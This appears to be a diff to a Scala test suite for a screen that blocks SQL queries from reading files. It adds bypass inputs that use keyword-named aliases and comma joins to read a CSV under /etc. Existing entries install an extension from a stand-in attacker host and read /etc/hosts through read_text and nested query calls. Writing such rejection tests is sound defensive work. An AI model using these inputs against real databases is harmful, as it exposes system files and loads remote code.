@@ -66,7 +66,14 @@ class FileAccessScreenSpec extends AnyFlatSpec with Matchers:
     "FORCE INSTALL httpfs FROM 'http://evil.example'",
     // in a batch, inside a literal a function runs
     "SELECT 1; SELECT * FROM read_text('/etc/hosts')",
-    "SELECT * FROM query('SELECT * FROM read_text(''/etc/hosts'')')"
+    "SELECT * FROM query('SELECT * FROM read_text(''/etc/hosts'')')",
+    // a keyword-named alias or column before a comma join (each read the CSV on the 2.0 CLI)
+    "SELECT * FROM range(1) AS values, '/etc/x.csv'",
+    "SELECT * FROM range(1) AS set, '/etc/x.csv'",
+    "SELECT * FROM range(1) set, '/etc/x.csv'",
+    "SELECT * FROM range(1) AS values, ('/etc/x.csv')",
+    "SELECT * FROM (SELECT 1 AS \"order\") r JOIN (SELECT 1 AS \"order\") s " +
+      "ON r.order = s.order, '/etc/x.csv'"
   )
 
   private val admitted = List(
